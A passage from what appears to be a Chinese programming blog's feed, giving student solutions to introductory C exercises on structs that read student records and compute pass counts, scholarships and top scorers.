title="2."></a>2.</h3><p>读入学生的信息：学号（8位整数,以2014开头即2014****）、姓名（20个字符，不包含空格）、学生类型（1位整数）和成绩（2位小数）。学生类型数据中，1表示普通学生，2表示体优生，3表示基地班学生，要求统计不及格的学生人数。不同类型的学生及格分数标准不同，对于普通学生，及格标准为60分，对于体优生，及格标准为50分，对于基地班学生，及格标准为65。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char num[10];</span><br><span class="line">    char name[20];</span><br><span class="line">    int <span class="built_in">type</span>;</span><br><span class="line">    double score;</span><br><span class="line">&#125;stu[105];</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,num;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        num=0;</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s%s%d%lf&quot;</span>,stu[i].num,stu[i].name,&amp;stu[i].<span class="built_in">type</span>,&amp;stu[i].score);</span><br><span class="line">            <span class="keyword">if</span>(stu[i].<span class="built_in">type</span>==1 &amp;&amp; stu[i].score&lt;60) num++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(stu[i].<span class="built_in">type</span>==2 &amp;&amp; stu[i].score&lt;50) num++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(stu[i].<span class="built_in">type</span>==3 &amp;&amp; stu[i].score&lt;65) num++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,num);</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s %s %d %.2lf\n&quot;</span>,stu[i].num,stu[i].name,stu[i].<span class="built_in">type</span>,stu[i].score);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>某校的惯例是在每学期的期末考试之后发放奖学金。发放的奖学金共有五种，获取的条件各自不同。现在给出若干学生的相关数据，请计算哪些同学获得的奖金总数最高（假设总有同学能满足获得奖学金的条件）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char name[25];</span><br><span class="line">    int final;</span><br><span class="line">    int frombitch;</span><br><span class="line">    char tutor;</span><br><span class="line">    char fromwest;</span><br><span class="line">    int article;</span><br><span class="line">    int money;</span><br><span class="line">&#125;stu[105];</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,sum,max;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        int i;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;105;i++) stu[i].money=0;</span><br><span class="line">        sum=0;</span><br><span class="line">        max=-1;</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s %d %d %c %c %d&quot;</span>,stu[i].name,</span><br><span class="line">&amp;stu[i].final,&amp;stu[i].frombitch,&amp;stu[i].tutor,&amp;stu[i].fromwest,&amp;stu[i].article);</span><br><span class="line">            <span class="keyword">if</span>(stu[i].article&gt;=1 &amp;&amp; stu[i].final&gt;80) stu[i].money+=8000;</span><br><span class="line">            <span class="keyword">if</span>(stu[i].final&gt;85 &amp;&amp; stu[i].frombitch&gt;80) stu[i].money+=4000;</span><br><span class="line">            <span class="keyword">if</span>(stu[i].final&gt;90) stu[i].money+=2000;</span><br><span class="line">            <span class="keyword">if</span>(stu[i].fromwest==<span class="string">&#x27;Y&#x27;</span> &amp;&amp; stu[i].final&gt;85) stu[i].money+=1000;</span><br><span class="line">            <span class="keyword">if</span>(stu[i].tutor==<span class="string">&#x27;Y&#x27;</span> &amp;&amp; stu[i].frombitch&gt;80) stu[i].money+=850;</span><br><span class="line">            sum+=stu[i].money;</span><br><span class="line">            <span class="keyword">if</span>(stu[i].money&gt;max)</span><br><span class="line">            &#123;</span><br><span class="line">                max=stu[i].money;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(stu[i].money==max)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n%d\n&quot;</span>,stu[i].name,stu[i].money);</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>聪聪的班主任王老师最近有点忙，可是他又是一位非常细心的老师，每次考试成绩都有专门的东西来记录，学期结束的时候给每位学生算了加权之后，他都要“关心关心”成绩不好的学生，并在假期给他们补补功课。什么是成绩不好呢？在王老师眼里，成绩不好当然就是加权成绩不及格咯！如今王老师这么忙，正好看你成天写程序闲着没事儿，于是他想让聪明的你来帮他写个程序，把那些不及格的同学的名单打印给他。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char name[25];</span><br><span class="line">    char num[15];</span><br><span class="line">    double score;</span><br><span class="line">&#125;stu[105];</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i,failnum;</span><br><span class="line">    int a[105];</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;105;i++) a[i]=-1;</span><br><span class="line">        failnum=0;</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s\n%s\n%lf&quot;</span>,stu[i].name,stu[i].num,&amp;stu[i].score);</span><br><span class="line">            <span class="keyword">if</span>(stu[i].score&lt;60)</span><br><span class="line">            &#123;</span><br><span class="line">                failnum++;</span><br><span class="line">                a[i]=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(failnum==0) <span class="built_in">printf</span>(<span class="string">&quot;They are Great!!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,failnum);</span><br><span class="line">            <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]!=-1)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,stu[i].name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]!=-1)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,stu[i].num);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]!=-1)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>,stu[i].score);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p>从键盘输入一些学生的学号(int),姓名(char 20)和成绩(double)，请你找出成绩从高到低的前三名同学的学号和姓名！本题用结构体来实现，结构体定义如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char name[25];</span><br><span class="line">    char num[15];</span><br><span class="line">    double score;</span><br><span class="line">&#125;stu[105];</span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,i;</span><br><span class="line">    int max[5],maxl[5];</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        max[0]=max[1]=max[2]=-1;</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s %s %lf&quot;</span>,stu[i].num,stu[i].name,&amp;stu[i].score);</span><br><span class="line">            <span class="keyword">if</span>(stu[i].score&gt;max[0])</span><br><span class="line">            &#123;</span><br><span class="line">                 max[0]=stu[i].score;</span><br><span class="line">                 maxl[0]=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n &amp;&amp; i!=maxl[0];i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(stu[i].score&gt;max[1])</span><br><span class="line">            &#123;</span><br><span class="line">                 max[1]=stu[i].score;</span><br><span class="line">                 maxl[1]=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=maxl[0] &amp;&amp; i!=maxl[1])</span><br><span class="line">            <span class="keyword">if</span>(stu[i].score&gt;max[2])</span><br><span class="line">            &#123;</span><br><span class="line">                 max[2]=stu[i].score;</span><br><span class="line">                 maxl[2]=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;3;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>,stu[maxl[i]].num,stu[maxl[i]].name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言实验 5</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-5/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-5/</url>
      
        <content type="html"><![CDATA[<h3 id="C语言-锐格实验"><a href="#C语言-锐格实验" class="headerlink" title="C语言 锐格实验"></a>C语言 锐格实验</h3><h5 id="五-结构体"><a href="#五-结构体" class="headerlink" title="五.结构体"></a>五.结构体</h5><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>从键盘读入学生的信息：学号（8位整数）、姓名（20个字符）、高等数学课程的成绩（2位小数）。 然后使用结构体来将这些数据读入并输出。输出时注意字段之间是2个空格！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char num[10];</span><br><span class="line">    char name[25];</span><br><span class="line">    double score;</span><br><span class="line">&#125;stu;</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    scanf(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    getchar();</span><br><span class="line">    int i;</span><br><span class="line">    <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        scanf(<span class="string">&quot;%s&quot;</span>,stu.num);</span><br><span class="line">        getchar();</span><br><span class="line">        scanf(<span class="string">&quot;%s&quot;</span>,stu.name);</span><br><span class="line">        getchar();</span><br><span class="line">        scanf(<span class="string">&quot;%lf&quot;</span>,&amp;stu.score);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s  %s  %.2lf\n&quot;</span>,stu.num,stu.name,stu.score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><span id="more"></span><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>高级语言这门课程已经考完期末试了，现在我们来统计一下这门课程的成绩分布。读入学生的信息：学号（8位整数）、姓名（20个字符）、高级语言程序设计这门课程的期末成绩（2位小数）。如果成绩大于等于80分，评定为优秀；如果成绩大于等于60分，且小于80分，评定为良好；成绩小于60分为不及格；现在让你统计优秀、良好和不及格的人数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char num[10];</span><br><span class="line">    char name[25];</span><br><span class="line">    double score;</span><br><span class="line">&#125;stu;</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        int g,nb,f=0;</span><br><span class="line">        g=nb=0;</span><br><span class="line">        getchar();</span><br><span class="line">        int i;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s %s %lf&quot;</span>,stu.num,stu.name,&amp;stu.score);</span><br><span class="line">            <span class="keyword">if</span>(stu.score&gt;=80.0) g++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(stu.score &gt;=60) nb++;</span><br><span class="line">            <span class="keyword">else</span> f++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>,g,nb,f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>本学期已经结束了，现在我们来统计一下学生的考试成绩。读入学生的信息：学号（8位整数）、姓名（20个字符）、高数、线代、英语和C语言这4门课程的期末成绩（2位小数）。请你帮助计算这4门课程的总分和平均分，并输出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char num[10];</span><br><span class="line">    char name[25];</span><br><span class="line">    double math;</span><br><span class="line">    double line;</span><br><span class="line">    double eng;</span><br><span class="line">    double c;</span><br><span class="line">&#125;stu;</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    double aver,sum;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        getchar();</span><br><span class="line">        int i;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s %s %lf %lf %lf %lf&quot;</span>,stu.num,stu.name,&amp;stu.math,&amp;stu.line,&amp;stu.eng,&amp;stu.c);</span><br><span class="line">            sum=stu.math+stu.line+stu.eng+stu.c;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s %s %.2lf %.2lf\n&quot;</span>,stu.num,stu.name,sum,sum/4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><p>从键盘输入一些学生的学号（int），姓名(char)，高数成绩，线代成绩，英语成绩和C语言成绩(四门成绩为double)，请你输出总分最高的学生的学号和姓名！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char num[10];</span><br><span class="line">    char name[25];</span><br><span class="line">    double math;</span><br><span class="line">    double line;</span><br><span class="line">    double eng;</span><br><span class="line">    double c;</span><br><span class="line">&#125;stu[105];</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n,maxl;</span><br><span class="line">    double aver,sum,max;</span><br><span class="line">    <span class="keyword">while</span>(scanf(<span class="string">&quot;%d&quot;</span>,&amp;n)!=-1)</span><br><span class="line">    &#123;</span><br><span class="line">        getchar();</span><br><span class="line">        int i;</span><br><span class="line">        <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            scanf(<span class="string">&quot;%s %s %lf %lf %lf %lf&quot;</span>,stu[i].num,stu[i].name,&amp;stu[i].math,&amp;stu[i].line,&amp;stu[i].eng,&amp;stu[i].c);</span><br><span class="line">            sum=stu[i].math+stu[i].line+stu[i].eng+stu[i].c;</span><br><span class="line">            <span class="keyword">if</span>(i==0)</span><br><span class="line">            &#123;</span><br><span class="line">                max=sum;</span><br><span class="line">                maxl=i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(sum&gt;max)</span><br><span class="line">                &#123;</span><br><span class="line">                    max=sum;</span><br><span class="line">                    maxl=i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>,stu[maxl].num,stu[maxl].name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><p>大表哥最近想去看电影，但是他不知道和谁去看，现在你有一份大表哥的同学录，大表哥最近很garry，你能帮助大表哥找出最符合他要求的人去陪他看电影吗？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">PS.大表哥喜欢综合分数最高的。综合分数=（颜值+学习成绩+性格）/3。其中大表哥不能和男人在一起（数据输入保证有女性）。</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">struct student&#123;</span><br><span class="line">    char name[50];</span><br><span class="line">    char sex;</span><br><span class="line">    double face;</span><br><span class="line">    double study;</span><br><span class="line">    double character;</span><br><span class="line">    double sum;</span><br><span class="line">&#125;stu[105];</span><br><span class="line"></span><br><span class="line">int <span class="function"><span class="title">main</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    int i,maxl;</span><br><span class="line">    double max=-1;</span><br><span class="line">    scanf(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        scanf(<span class="string">&quot;%s %c %lf %lf %lf&quot;</span>,stu[i].name, &amp;stu[i].sex, &amp;stu[i].face,&amp;stu[i].study,&amp;stu[i].character);</span><br><span class="line">        stu[i].sum=stu[i].face+stu[i].study+stu[i].character;</span><br><span class="line">        <span class="keyword">if</span>(stu[i].sex==<span class="string">&#x27;f&#x27;</span> &amp;&amp; stu[i].sum&gt;max)</span><br><span class="line">        &#123;</span><br><span class="line">            max=stu[i].sum;</span><br><span class="line">            maxl=i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I choose %s,and her score is %.2lf.\n&quot;</span>,stu[maxl].name,stu[maxl].sum/3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> 基础 </tag>
            
            <tag> 锐格 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言实验 4</title>
      <link href="/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-4/"/>
      <url>/2021/12/15/C-%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C-4/</url>
      
